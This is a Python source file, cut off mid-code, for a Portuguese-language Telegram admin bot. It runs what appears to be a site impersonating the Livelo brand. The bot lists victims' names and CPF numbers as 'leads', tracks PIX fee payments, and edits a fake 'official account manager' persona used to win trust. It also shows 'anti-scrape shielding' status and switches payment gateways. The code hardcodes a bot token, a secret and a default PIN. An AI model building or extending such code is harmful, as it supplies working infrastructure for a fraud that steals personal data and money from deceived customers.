import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
import requests
import sqlite3
import os

# ==========================================
# CONFIGURACOES DO BOT
# ==========================================
def get_db_token():
    try:
        for p in ["/tmp/livelo.db", os.path.join(os.path.dirname(__file__), "livelo.db"), os.path.join(os.path.dirname(__file__), "database.db")]:
            if os.path.exists(p):
                try:
                    conn = sqlite3.connect(p)
                    row = conn.execute("SELECT value FROM sys_config WHERE key='telegram_token'").fetchone()
                    conn.close()
                    if row and row[0] and len(row[0].strip()) > 20 and ":" in row[0]:
                        return row[0].strip()
                except:
                    pass
    except:
        pass
    return None

BOT_TOKEN = get_db_token()
if not BOT_TOKEN:
    env_t = (os.environ.get("TELEGRAM_BOT_TOKEN") or os.environ.get("BOT_TOKEN") or "").strip()
    if env_t and len(env_t) > 20 and ":" in env_t and env_t != "SEU_TOKEN_AQUI":
        BOT_TOKEN = env_t
if not BOT_TOKEN:
    BOT_TOKEN = "8390380990:AAGeDvwbsOz7cHXBy22y0vbR4V6DOEFzeA8"

ADMIN_CHAT_ID  = os.environ.get("ID_ADMIN_SUPREMO", os.environ.get("SUPREME_ADMIN_ID", os.environ.get("ADMIN_CHAT_ID", "8932547795")))
BOT_SECRET     = os.environ.get("BOT_SECRET", "9bd3434165fd220dfcd17259ba07ce6b")
BASE_URL       = os.environ.get("RENDER_EXTERNAL_URL", os.environ.get("VERCEL_PROJECT_PRODUCTION_URL", "https://livelocartaolimite.vercel.app"))
if BASE_URL and not BASE_URL.startswith("http"): BASE_URL = "https://" + BASE_URL
BASE_URL       = BASE_URL.rstrip("/")
API_BASE       = BASE_URL

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML", threaded=False)


def get_dynamic_supreme_id():
    try:
        res = api_call("get_config")
        if res and res.get("ok"):
            cfg = res.get("config", {})
            adm = cfg.get('supreme_admin_id')
            if adm: return str(adm)
    except:
        pass
    return str(ADMIN_CHAT_ID or "8932547795")

# Admins can be a list now, but "supreme" is the dynamic creator or env
def is_supreme(chat_id, user_id=None):
    sup_id = get_dynamic_supreme_id()
    if str(chat_id) in [sup_id, "8932547795"]: return True
    if user_id and str(user_id) in [sup_id, "8932547795"]: return True
    return False

def is_admin(chat_id, user_id=None):
    # Allow all to trigger start and see ID, but operations will require supreme
    return True

def api_call(action, payload=None):
    try:
        try:
            from app import process_bot_action
            # If this runs without raising an exception, we are inside Flask context
            # and can bypass the HTTP overhead!
            return process_bot_action(action, payload)
        except Exception as local_e:
            pass

        r = requests.post(
            f"{API_BASE}/api/internal/bot-gateway",
            json={"action": action, "payload": payload or {}},
            headers={"X-Bot-Secret": BOT_SECRET},
            timeout=10
        )
        return r.json()
    except Exception as e:
        return {"ok": False, "error": str(e)}

def upload_file_to_api(file_url, endpoint="/api/internal/set-logo-file", field_name="logo_file"):
    try:
        img_resp = requests.get(file_url, timeout=15)
        img_resp.raise_for_status()
        ext = file_url.rsplit(".", 1)[-1] if "." in file_url else "jpg"
        fname = f"upload_{os.urandom(4).hex()}.{ext}"
        r = requests.post(
            f"{API_BASE}{endpoint}",
            files={field_name: (fname, img_resp.content, f"image/{ext}")},
            headers={"X-Bot-Secret": BOT_SECRET},
            timeout=15
        )
        return r.json()
    except Exception as e:
        return {"ok": False, "error": str(e)}

user_states = {}

def check_group_membership(user_id):
    if str(user_id) in [str(ADMIN_CHAT_ID), "8932547795"]:
        return True
    try:
        member = bot.get_chat_member(chat_id=ADMIN_CHAT_ID, user_id=user_id)
        if member.status in ['creator', 'administrator', 'member', 'restricted']:
            return True
    except:
        pass
    return False

@bot.message_handler(commands=['painel', 'acesso'])
def cmd_painel(message):
    tg_id = str(message.from_user.id)
    chat_id = str(message.chat.id)
    
    if not check_group_membership(tg_id):
        bot.reply_to(message, "❌ <b>Acesso Negado:</b> Conexão blindada recusada. Você não está no Grupo Fechado Oficial.")
        return
    
    # Try to generate an intelligent OTP code
    res = api_call("generate_otp", {"tg_id": tg_id})
    
    if res.get("ok"):
        url_path = res.get("url_path", "/nexus-gate-9x02")
        role_name = "SUPREMO" if res.get("role") == "supreme" else "GERENTE"
        txt = (
            f"🔐 <b>ACESSO AO PAINEL BLINDADO ({role_name})</b>\n\n"
            f"🔗 <b>Acesso via Senha OTP:</b>\n{BASE_URL}{url_path}\n"
            f"🔑 <b>PIN Dinâmico:</b> <code>{res['code']}</code>\n"
            "<i>(Válido por 5 min. Uso único)</i>\n\n"
            "⚡ <b>Ou clique abaixo para entrar sem senha usando sua conta Telegram:</b>"
        )
        markup = InlineKeyboardMarkup()
        btn = InlineKeyboardButton("📱 Acessar Painel Direto (Auto-Login)", web_app=WebAppInfo(url=f"{BASE_URL}/admin"))
        markup.add(btn)
        
        bot.reply_to(message, txt, reply_markup=markup)
    else:
        # Fallback if the user is not authorized or an error occurs
        if is_supreme(chat_id, tg_id):
            pin = os.environ.get("SUPREME_PIN", "123456")
            txt = (
                "🔐 <b>ACESSO AO PAINEL SUPREMO (Fallback)</b>\n\n"
                f"🔗 <b>URL:</b> {BASE_URL}/nexus-supreme/fallback\n"
                f"🔑 <b>PIN de Acesso:</b> <code>{pin}</code>\n\n"
                "⚡ <b>Ou tente o acesso direto pelo Telegram:</b>"
            )
            markup = InlineKeyboardMarkup()
            btn = InlineKeyboardButton("📱 Acessar Painel Direto", web_app=WebAppInfo(url=f"{BASE_URL}/admin"))
            markup.add(btn)
            
            bot.reply_to(message, txt, reply_markup=markup)
        else:
            bot.reply_to(message, f"❌ Acesso Negado: {res.get('error', 'Sem permissão.')}")

@bot.message_handler(commands=['liberar'])
def cmd_liberar(message):
    if not is_supreme(message.chat.id, message.from_user.id):
        bot.reply_to(message, "Acesso negado. Apenas o Administrador Supremo pode liberar o sistema.")
        return
    res = api_call("unlock_admin")
    if res.get("ok"):
        bot.reply_to(message, "✅ <b>SISTEMA LIBERADO COM SUCESSO!</b>\nO bloqueio de segurança foi removido e as tentativas foram zeradas.")
    else:
        bot.reply_to(message, f"❌ Falha ao liberar sistema: {res.get('error', 'Erro Desconhecido')}")

@bot.message_handler(commands=['reiniciar', 'resetar'])
def cmd_reiniciar(message):
    if not is_supreme(message.chat.id, message.from_user.id):
        bot.reply_to(message, "Acesso negado. Apenas o Administrador Supremo pode reiniciar o banco de dados.")
        return
    res = api_call("reset_system")
    if res.get("ok"):
        bot.reply_to(message, "⚠️ <b>SISTEMA REINICIADO COM SUCESSO!</b>\nTodos os Leads e Pagamentos antigos foram apagados. O sistema está 100% limpo e pronto para rodar 24/7.")
    else:
        bot.reply_to(message, f"❌ Erro ao reiniciar: {res.get('error', 'Desconhecido')}")

@bot.message_handler(commands=['backup', 'salvar'])
def cmd_backup(message):
    if not is_supreme(message.chat.id, message.from_user.id):
        return
    bot.reply_to(message, "⏳ Preparando backup de segurança do sistema...")
    try:
        # Pega o arquivo do banco de dados localmente (caso esteja na mesma pasta)
        db_path = os.path.join(os.path.dirname(__file__), "livelo.db")
        if not os.path.exists(db_path):
            db_path = os.path.join(os.path.dirname(__file__), "database.db")
        
        if os.path.exists(db_path):
            with open(db_path, "rb") as f:
                bot.send_document(message.chat.id, f, caption="🛡️ <b>BACKUP DO COMANDO SUPREMO</b> 🛡️\n\nAqui está o seu banco de dados completo. Guarde com segurança para não perder nenhuma informação!")
        else:
            bot.reply_to(message, "❌ Erro: O arquivo do banco de dados local não foi encontrado.")
    except Exception as e:
        bot.reply_to(message, f"❌ Falha ao gerar backup: {str(e)}")


# --- COMANDOS AVANÇADOS DE REDE ---
@bot.message_handler(commands=['id', 'info'])
def cmd_info(message):
    chat = message.chat
    user = message.from_user
    
    txt = (
        "🕵️‍♂️ <b>INFORMAÇÕES DE REDE E IDS</b> 🕵️‍♂️\n"
        "<i>Use estes dados para configurar seu painel com precisão.</i>\n\n"
        "👤 <b>DADOS DO USUÁRIO</b>\n"
        f"┣ <b>Nome:</b> {user.first_name} {user.last_name or ''}\n"
        f"┣ <b>ID (User):</b> <code>{user.id}</code>\n"
        f"┗ <b>Username:</b> @{user.username or 'N/A'}\n\n"
        "💬 <b>DADOS DO CHAT/GRUPO</b>\n"
        f"┣ <b>Nome do Chat:</b> {chat.title or chat.first_name}\n"
        f"┣ <b>ID (Chat):</b> <code>{chat.id}</code>\n"
        f"┗ <b>Tipo:</b> {chat.type}\n"
    )
    if message.message_thread_id:
        txt += f"\n🧵 <b>ID do Tópico (Thread):</b> <code>{message.message_thread_id}</code>\n"
        
    txt += "\n<i>💡 Dica: Clique nos IDs acima para copiar.</i>"
    bot.reply_to(message, txt)


@bot.message_handler(commands=['setlog'])
def cmd_setlog(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    if not is_supreme(chat_id, user_id):
        return
        
    thread_id = message.message_thread_id or 0
    markup = InlineKeyboardMarkup(row_width=1)
    markup.add(
        InlineKeyboardButton("📢 Canal Principal", callback_data=f"bindlog_tg_log_channel_{chat_id}_{thread_id}"),
        InlineKeyboardButton("📝 Leads", callback_data=f"bindlog_tg_log_leads_{chat_id}_{thread_id}"),
        InlineKeyboardButton("💸 Pagamentos", callback_data=f"bindlog_tg_log_pagamentos_{chat_id}_{thread_id}"),
        InlineKeyboardButton("🚪 Entradas/Acessos", callback_data=f"bindlog_tg_log_acessos_{chat_id}_{thread_id}")
    )
    bot.reply_to(message, "Selecione para qual módulo este chat será o canal de Log:", reply_markup=markup)


# --- MENU INICIAL & COMANDOS DIRETOS ---
@bot.message_handler(commands=['dashboard', 'financeiro', 'metricas', 'pix'])
def cmd_dashboard(message):
    if not is_admin(message.chat.id, message.from_user.id):
        bot.send_message(message.chat.id, "Acesso negado.")
        return
    res = api_call("get_financeiro")
    if res.get("ok"):
        f = res.get("stats", {})
        txt = (
            "📈 <b>DASHBOARD SUPREMO & MÉTRICAS DE VENDAS</b> 📈\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🛡️ <b>Blindagem Ant-Scrape:</b> {f.get('security_status', '🟢 Ativa')}\n"
            f"📡 <b>Status da API:</b> {f.get('api_status', '🟢 Sincronizada')}\n"
            f"🖥️ <b>Host:</b> {f.get('host_status', '🟢 Online')}\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"👥 <b>Entradas (Leads no Funil):</b> <b>{f.get('qtd_leads', 0)}</b>\n"
            f"💳 <b>Cartões Personalizados:</b> <b>{f.get('cartoes_feitos', 0)}</b>\n"
            f"🧾 <b>PIX Gerados (Total):</b> <b>{f.get('pagamentos_gerados', 0)}</b>\n"
            f"💸 <b>PIX Pagos (Aprovados):</b> 🟢 <b>{f.get('qtd_pago', 0)}</b>\n"
            f"⏳ <b>PIX Pendentes (Aguardando):</b> 🟡 <b>{f.get('qtd_pendente', 0)}</b>\n"
            f"❌ <b>PIX Cancelados / Recusados:</b> 🔴 <b>{f.get('qtd_cancelado', 0)}</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"💰 <b>FATURAMENTO TOTAL REAL:</b> 🟢 <b>R$ {f.get('total_pago', '0,00')}</b>\n"
        )
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("🔄 Atualizar Métricas", callback_data="menu_financeiro"),
            InlineKeyboardButton("💳 Ver Gateways", callback_data="menu_gateways")
        )
        markup.add(InlineKeyboardButton("🔙 Menu Principal", callback_data="menu_main"))
        bot.send_message(message.chat.id, txt, reply_markup=markup, parse_mode="HTML")
    else:
        bot.send_message(message.chat.id, "❌ Erro ao consultar dados do dashboard financeiro.")


@bot.message_handler(commands=['gerente', 'manager'])
def cmd_gerente(message):
    if not is_supreme(message.chat.id, message.from_user.id):
        bot.send_message(message.chat.id, "Acesso restrito ao Admin Supremo.")
        return
    show_manager_profile(message.chat.id)


@bot.message_handler(commands=['gateways', 'gateway'])
def cmd_gateways(message):
    if not is_supreme(message.chat.id, message.from_user.id):
        bot.send_message(message.chat.id, "Acesso restrito ao Admin Supremo.")
        return
    res = api_call("get_gateway_metrics")
    if res.get("ok"):
        m = res.get("metrics", {})
        active_gw = m.get("active_gateway", "elitepay")
        ep = m.get("elitepay", {})
        un = m.get("uniaopay", {})
        ep_st = str(ep.get("status", "")).lower()
        ep_status_ico = "🟢 ONLINE" if ep_st == "online" else ("🟡 INSTÁVEL" if ep_st == "unstable" else "🔴 FORA DO AR")
        un_st = str(un.get("status", "")).lower()
        un_status_ico = "🟢 ONLINE" if un_st == "online" else ("🟡 INSTÁVEL" if un_st == "unstable" else "🔴 FORA DO AR")
        active_name_badge = "🟢 <b>Elite PAYbr</b>" if active_gw == "elitepay" else "🟢 <b>União 7 Pay</b>"
        
        txt = (
            "👑 <b>PAINEL SUPREMO DE GATEWAYS PIX</b>\n"
            "<i>Métricas 100% reais, auditadas e integradas ao vivo.</i>\n\n"
            f"⚡ <b>GATEWAY PRINCIPAL ATIVO:</b> {active_name_badge}\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"💎 <b>ELITE PAYbr</b>  {ep_status_ico}\n"
            f"⏱️ <b>Latência:</b> <code>{ep.get('ping_ms', 'N/A')}</code>\n"
            f"💰 <b>Saldo em Conta:</b> <code>R$ {ep.get('balance', '0,00')}</code>\n"
            f"📊 <b>PIX Gerados:</b> {ep.get('qtd_gerado', 0)} (R$ {ep.get('total_gerado', '0,00')})\n"
            f"💸 <b>PIX Pagos:</b> {ep.get('qtd_pago', 0)} (R$ {ep.get('total_pago', '0,00')})\n"
            f"📈 <b>Conversão Real:</b> <b>{ep.get('conversao', '0.0%')}</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🔷 <b>UNIÃO 7 PAY</b>  {un_status_ico}\n"
            f"⏱️ <b>Latência:</b> <code>{un.get('ping_ms', 'N/A')}</code>\n"
            f"📊 <b>PIX Gerados:</b> {un.get('qtd_gerado', 0)} (R$ {un.get('total_gerado', '0,00')})\n"
            f"💸 <b>PIX Pagos:</b> {un.get('qtd_pago', 0)} (R$ {un.get('total_pago', '0,00')})\n"
            f"📈 <b>Conversão Real:</b> <b>{un.get('conversao', '0.0%')}</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "💡 <i>Dica: Alterne instantaneamente o gateway ativo com os botões abaixo.</i>"
        )
        markup = InlineKeyboardMarkup(row_width=2)
        if active_gw == "elitepay":
            markup.add(
                InlineKeyboardButton("✅ Elite PAYbr (Principal)", callback_data="noop"),
                InlineKeyboardButton("🔄 Definir União 7 Pay Principal", callback_data="set_gw_uniaopay")
            )
        else:
            markup.add(
                InlineKeyboardButton("🔄 Definir Elite PAYbr Principal", callback_data="set_gw_elitepay"),
                InlineKeyboardButton("✅ União 7 Pay (Principal)", callback_data="noop")
            )
        markup.add(
            InlineKeyboardButton("🧪 Testar Latência / Ping", callback_data="test_gateways"),
            InlineKeyboardButton("🔄 Atualizar Métricas", callback_data="menu_gateways")
        )
        markup.add(InlineKeyboardButton("🔙 Menu Principal", callback_data="menu_main"))
        bot.send_message(message.chat.id, txt, reply_markup=markup, parse_mode="HTML")
    else:
        bot.send_message(message.chat.id, "❌ Erro ao consultar métricas dos gateways.")


def show_manager_profile(chat_id, message_id=None):
    res = api_call("get_config")
    cfg = res.get("config", {}) if res.get("ok") else {}
    name = cfg.get('mgr_name', 'Lucas Cardoso')
    years = cfg.get('mgr_years', '3')
    whatsapp = cfg.get('mgr_whatsapp', '11987654321')
    avatar = cfg.get('mgr_avatar', '')
    
    caption = (
        "👩‍💼 <b>PERFIL OFICIAL DA GERENTE DE CONTAS</b>\n"
        "<i>Este é o perfil real que aparece na página para os leads conversarem no WhatsApp.</i>\n\n"
        f"👤 <b>Nome Oficial:</b> <b>{name}</b>\n"
        f"📱 <b>WhatsApp de Contato:</b> <code>{whatsapp}</code>\n"
        f"📅 <b>Tempo na Empresa:</b> {years} anos\n"
        f"💬 <b>Selo de Confiabilidade:</b> Melhor Gerente Livelo\n\n"
        "👇 <b>Selecione o que deseja alterar via botões interativos:</b>"
    )
    
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("✏️ Alterar Nome", callback_data="set_mgr_name"),
        InlineKeyboardButton("📱 Alterar WhatsApp", callback_data="set_mgr_whatsapp")
    )
    markup.add(
        InlineKeyboardButton("📅 Alterar Anos", callback_data="set_mgr_years"),
        InlineKeyboardButton("📸 Alterar Foto Real", callback_data="wait_img_avatar")
    )
    markup.add(
        InlineKeyboardButton("🔄 Atualizar Preview", callback_data="menu_gerente"),
        InlineKeyboardButton("🔙 Menu Principal", callback_data="menu_main")
    )
    
    if avatar and avatar.startswith("data:image"):
        import base64
        from io import BytesIO
        img_bytes = base64.b64decode(avatar.split(",")[1])
        bot.send_photo(chat_id, BytesIO(img_bytes), caption=caption, reply_markup=markup, parse_mode="HTML")
    elif avatar and (avatar.startswith("http://") or avatar.startswith("https://")):
        try:
            bot.send_photo(chat_id, avatar, caption=caption, reply_markup=markup, parse_mode="HTML")
        except:
            if message_id:
                bot.edit_message_text(caption + "\n\n<i>[Foto ativa]</i>", chat_id, message_id, reply_markup=markup, parse_mode="HTML")
            else:
                bot.send_message(chat_id, caption + "\n\n<i>[Foto ativa]</i>", reply_markup=markup, parse_mode="HTML")
    else:
        if message_id:
            bot.edit_message_text(caption + "\n\n<i>[Foto padrão ativa - envie uma foto para personalizar]</i>", chat_id, message_id, reply_markup=markup, parse_mode="HTML")
        else:
            bot.send_message(chat_id, caption + "\n\n<i>[Foto padrão ativa - envie uma foto para personalizar]</i>", reply_markup=markup, parse_mode="HTML")


@bot.message_handler(commands=["start", "menu"])
def send_welcome(message):
    if not is_admin(message.chat.id, message.from_user.id):
        bot.send_message(message.chat.id, "Acesso negado.")
        return
    show_main_menu(message.chat.id, message.from_user.id)

def show_main_menu(chat_id, user_id=None, message_id=None):
    markup = InlineKeyboardMarkup(row_width=2)
    
    if is_supreme(chat_id, user_id):
        markup.add(
            InlineKeyboardButton("💳 Gateways de Pagamento", callback_data="menu_gateways"),
            InlineKeyboardButton("📊 Dashboard Financeiro", callback_data="menu_financeiro")
        )
        markup.add(
            InlineKeyboardButton("👩‍💼 Gerente de Contas", callback_data="menu_gerente"),
            InlineKeyboardButton("⚙️ Config Gerais", callback_data="menu_config")
        )
        markup.add(
            InlineKeyboardButton("📢 Canais de Logs", callback_data="menu_logs"),
            InlineKeyboardButton("👥 Leads Recentes", callback_data="menu_leads")
        )
        markup.add(
            InlineKeyboardButton("💰 Pagamentos", callback_data="menu_pagamentos")
        )
    else:
        # Normal admin sees leads and dashboard
        markup.add(
            InlineKeyboardButton("👥 Leads Recentes", callback_data="menu_leads")
        )
        markup.add(
            InlineKeyboardButton("📊 Dashboard Financeiro", callback_data="menu_financeiro")
        )
        
    text = (
        "👑 <b>Painel Supremo Livelo</b>\n\n"
        "Centro de Comando Ativo. Escolha uma opção pelos botões ou use os comandos rápidos:\n"
        "• /dashboard — Métricas de PIX e Vendas\n"
        "• /gateways — Painel de Gateways & Troca em 1 Clique\n"
        "• /gerente — Foto Real, WhatsApp e Dados da Gerente"
    )
    
    if message_id:
        bot.edit_message_text(text, chat_id, message_id, reply_markup=markup)
    else:
        bot.send_message(chat_id, text, reply_markup=markup)

# --- CALLBACKS ---
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    chat_id = call.message.chat.id
    user_id = call.from_user.id
    msg_id = call.message.message_id
    data = call.data
    
    try:
        bot.answer_callback_query(call.id)
    except:
        pass
    if not is_admin(chat_id, user_id):
        bot.answer_callback_query(call.id, "Acesso negado.")
        return

    # Clear state
    user_states.pop(str(chat_id), None)

    if data == "menu_main":
        show_main_menu(chat_id, user_id, message_id=msg_id)
        

    elif data == "menu_gerente" and is_supreme(chat_id, user_id):
        show_manager_profile(chat_id, message_id=msg_id)

    elif data == "preview_manager" and is_supreme(chat_id, user_id):
        show_manager_profile(chat_id, message_id=msg_id)

    elif data == "menu_config" and is_supreme(chat_id, user_id):
        res = api_call("get_config")
        cfg = res.get("config", {}) if res.get("ok") else {}
        
        markup = InlineKeyboardMarkup(row_width=1)
        markup.add(
            InlineKeyboardButton(f"👩‍💼 Painel da Gerente (Foto/Perfil)", callback_data="menu_gerente"),
            InlineKeyboardButton(f"📱 WhatsApp Gerente: {cfg.get('mgr_whatsapp', 'Não def.')}", callback_data="set_mgr_whatsapp"),
            InlineKeyboardButton(f"👩‍💼 Nome da Gerente: {cfg.get('mgr_name', 'Não def.')}", callback_data="set_mgr_name"),
            InlineKeyboardButton(f"📅 Anos de Empresa: {cfg.get('mgr_years', 'Não def.')}", callback_data="set_mgr_years"),
            InlineKeyboardButton(f"🔑 API Token CPF", callback_data="set_cpf_token"),
            InlineKeyboardButton(f"💬 Texto do WhatsApp", callback_data="set_wa_text"),
            InlineKeyboardButton(f"🚚 Valor Frete Expresso: R$ {cfg.get('frete_expresso', '24,90')}", callback_data="set_frete_expresso"),
            InlineKeyboardButton(f"🚚 Valor Frete Padrão: R$ {cfg.get('frete_padrao', '19,90')}", callback_data="set_frete_padrao"),
            InlineKeyboardButton(f"🖼️ Alterar Avatar Gerente", callback_data="wait_img_avatar"),
            InlineKeyboardButton(f"🖼️ Alterar Logo do Site", callback_data="wait_img_logo"),
            InlineKeyboardButton(f"🖼️ Alterar Favicon", callback_data="wait_img_favicon"),
            InlineKeyboardButton("🔙 Voltar", callback_data="menu_main")
        )
        bot.edit_message_text("⚙️ <b>Configurações Gerais</b>\nSelecione o que deseja alterar:", chat_id, msg_id, reply_markup=markup)

    elif data == "menu_logs" and is_supreme(chat_id, user_id):
        res = api_call("get_config")
        cfg = res.get("config", {}) if res.get("ok") else {}
        
        markup = InlineKeyboardMarkup(row_width=1)
        markup.add(
            InlineKeyboardButton(f"🤖 Bot Token (Avançado)", callback_data="set_telegram_token"),
            InlineKeyboardButton(f"📢 Canal Principal: {cfg.get('tg_log_channel', 'Não def.')}", callback_data="set_tg_log_channel"),
            InlineKeyboardButton(f"🧵 ID do Tópico: {cfg.get('tg_log_thread_id', 'Não def.')}", callback_data="set_tg_log_thread_id"),
            InlineKeyboardButton(f"📝 Canal Leads Específico: {cfg.get('tg_log_leads', 'Não def.')}", callback_data="set_log_leads"),
            InlineKeyboardButton(f"💸 Canal Pagamentos Específico: {cfg.get('tg_log_pagamentos', 'Não def.')}", callback_data="set_log_pagamentos"),
            InlineKeyboardButton(f"🚪 Canal Entradas/Saídas: {cfg.get('tg_log_acessos', 'Não def.')}", callback_data="set_log_acessos"),
            InlineKeyboardButton("🔙 Voltar", callback_data="menu_main")
        )
        bot.edit_message_text("📢 <b>Canais de Log e Bot</b>\nConfigure onde as notificações devem chegar:", chat_id, msg_id, reply_markup=markup)


    elif data.startswith("bindlog_") and is_supreme(chat_id, user_id):
        parts = data.split("_")
        # bindlog_tg_log_leads_-100123_0
        db_key = "_".join(parts[1:-2])
        bind_chat_id = parts[-2]
        bind_thread_id = parts[-1]
        
        updates = {db_key: bind_chat_id}
        if bind_thread_id != "0":
            updates["tg_log_thread_id"] = bind_thread_id
            
        res = api_call("set_config", updates)
        if res.get("ok"):
            bot.send_message(chat_id, f"✅ Chat {bind_chat_id} vinculado ao log '{db_key}' com sucesso!")
        else:
            bot.send_message(chat_id, f"❌ Erro ao vincular: {res.get('error')}")

    elif data.startswith("set_") and is_supreme(chat_id, user_id):
        key_map = {
            "set_cpf_token": ("cpf_token", "Digite o token de validação da API CPF:"),
            "set_wa_text": ("wa_text", "Digite o texto padrão da Gerente no WhatsApp:"),
            "set_mgr_name": ("mgr_name", "Digite o novo Nome da Gerente:"),
            "set_mgr_whatsapp": ("mgr_whatsapp", "Digite o número de WhatsApp da Gerente com DDD (ex: 11987654321):"),
            "set_mgr_years": ("mgr_years", "Digite a quantidade de Anos na Empresa:"),
            "set_frete_expresso": ("frete_expresso", "Digite o valor do frete expresso (ex: 24,90):"),
            "set_frete_padrao": ("frete_padrao", "Digite o valor do frete padrão (ex: 19,90):"),
            "set_telegram_token": ("telegram_token", "Digite o Token do seu Bot (Pego no BotFather):"),
            "set_tg_log_channel": ("tg_log_channel", "Digite o ID do Canal/Grupo Principal (-100...):"),
            "set_tg_log_thread_id": ("tg_log_thread_id", "Digite o ID do Tópico (Thread ID) caso seja grupo com tópicos (ou 0 para geral):"),
            "set_log_leads": ("tg_log_leads", "Digite o ID do canal Específico para Leads (-100...):"),
            "set_log_pagamentos": ("tg_log_pagamentos", "Digite o ID do canal Específico para Pagamentos (-100...):"),
            "set_log_acessos": ("tg_log_acessos", "Digite o ID do canal Específico para Acessos (-100...):")
        }
        if data in key_map:
            db_key, prompt = key_map[data]
            user_states[str(chat_id)] = {"action": "wait_text", "key": db_key, "msg_id": msg_id}
            
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("❌ Cancelar", callback_data="menu_config" if "log" not in data and "tg_" not in data and "telegram" not in data else "menu_logs"))
            bot.edit_message_text(f"✏️ {prompt}", chat_id, msg_id, reply_markup=markup)

    elif data.startswith("wait_img_") and is_supreme(chat_id, user_id):
        img_type = data.replace("wait_img_", "")
        user_states[str(chat_id)] = {"action": "wait_image", "type": img_type, "msg_id": msg_id}
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("❌ Cancelar", callback_data="menu_config"))
        bot.edit_message_text(f"📸 Envie agora a imagem (como foto ou arquivo) para atualizar o(a) <b>{img_type.upper()}</b>:", chat_id, msg_id, reply_markup=markup)

    elif data == "menu_leads":
        res = api_call("get_leads", {"limit": 5})
        if res.get("ok"):
            leads = res.get("leads", [])
            txt = "👥 <b>Últimos 5 Leads:</b>\n\n"
            for L in leads:
                txt += f"👤 <b>{L.get('nome', 'Sem nome')}</b>\nCPF: <code>{L.get('cpf', '-')}</code>\nCartão: {L.get('card_style', '-')}\nStatus: {L.get('pix_status', '-')}\n\n"
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("🔙 Voltar", callback_data="menu_main"))
            bot.edit_message_text(txt if leads else "Nenhum lead.", chat_id, msg_id, reply_markup=markup)
        else:
            bot.answer_callback_query(call.id, "Erro ao buscar leads.")

    elif data == "menu_pagamentos" and is_supreme(chat_id, user_id):
        res = api_call("get_payments", {"limit": 5})
        if res.get("ok"):
            pags = res.get("payments", [])
            txt = "💰 <b>Últimos 5 Pagamentos:</b>\n\n"
            for P in pags:
                txt += f"💸 R$ {P.get('amount', 0)}\nStatus: {P.get('status', '-')}\nID: <code>{P.get('payment_id', '-')}</code>\n\n"
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("🔙 Voltar", callback_data="menu_main"))
            bot.edit_message_text(txt if pags else "Nenhum pagamento.", chat_id, msg_id, reply_markup=markup)
        else:
            bot.answer_callback_query(call.id, "Erro ao buscar pagamentos.")

    elif data == "menu_financeiro":
        res = api_call("get_financeiro")
        if res.get("ok"):
            f = res.get("stats", {})
            txt = (
                "📈 <b>DASHBOARD SUPREMO & MÉTRICAS</b> 📈\n"
                "──────────────────────\n"
                f"🛡️ <b>Blindagem:</b> {f.get('security_status', '🔴 Desativada')}\n"
                f"📡 <b>Status da API:</b> {f.get('api_status', '🔴 Offline')}\n"
                f"🖥️ <b>Host:</b> {f.get('host_status', '🔴 Offline')}\n"
                "──────────────────────\n"
                f"👥 <b>Entradas (Leads):</b> {f.get('qtd_leads', 0)}\n"
                f"💳 <b>Cartões Feitos:</b> {f.get('cartoes_feitos', 0)}\n"
                f"🧾 <b>Pagamentos Gerados:</b> {f.get('pagamentos_gerados', 0)}\n"
                f"💸 <b>Pagamentos Confirmados:</b> {f.get('qtd_pago', 0)}\n"
                f"⏳ <b>Pagamentos Pendentes:</b> {f.get('qtd_pendente', 0)}\n"
                f"❌ <b>Pagamentos Cancelados:</b> {f.get('qtd_cancelado', 0)}\n"
                "──────────────────────\n"
                f"💰 <b>Total Faturado Real:</b> R$ {f.get('total_pago', '0,00')}\n"
            )
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("🔙 Voltar", callback_data="menu_main"))
            bot.edit_message_text(txt, chat_id, msg_id, reply_markup=markup)
        else:
            bot.answer_callback_query(call.id, "Erro ao carregar painel financeiro.")

    elif data == "menu_gateways" and is_supreme(chat_id, user_id):
        res = api_call("get_gateway_metrics")
        if res.get("ok"):
            m = res.get("metrics", {})
            active_gw = m.get("active_gateway", "elitepay")
            ep = m.get("elitepay", {})
            un = m.get("uniaopay", {})
            
            ep_st = str(ep.get("status", "")).lower()
            ep_status_ico = "🟢 ONLINE" if ep_st == "online" else ("🟡 INSTÁVEL" if ep_st == "unstable" else "🔴 FORA DO AR")
            un_st = str(un.get("status", "")).lower()
            un_status_ico = "🟢 ONLINE" if un_st == "online" else ("🟡 INSTÁVEL" if un_st == "unstable" else "🔴 FORA DO AR")
            
            active_name_badge = "🟢 <b>Elite PAYbr</b>" if active_gw == "elitepay" else "🟢 <b>União 7 Pay</b>"
            
            txt = (
                "👑 <b>PAINEL SUPREMO DE GATEWAYS PIX</b>\n"
                "<i>Métricas 100% reais, auditadas e integradas ao vivo.</i>\n\n"
                f"⚡ <b>GATEWAY PRINCIPAL ATIVO:</b> {active_name_badge}\n\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                f"💎 <b>ELITE PAYbr</b>  {ep_status_ico}\n"
                f"⏱️ <b>Latência:</b> <code>{ep.get('ping_ms', 'N/A')}</code>\n"
                f"💰 <b>Saldo em Conta:</b> <code>R$ {ep.get('balance', '0,00')}</code>\n"
                f"📊 <b>PIX Gerados:</b> {ep.get('qtd_gerado', 0)} (R$ {ep.get('total_gerado', '0,00')})\n"
                f"💸 <b>PIX Pagos:</b> {ep.get('qtd_pago', 0)} (R$ {ep.get('total_pago', '0,00')})\n"
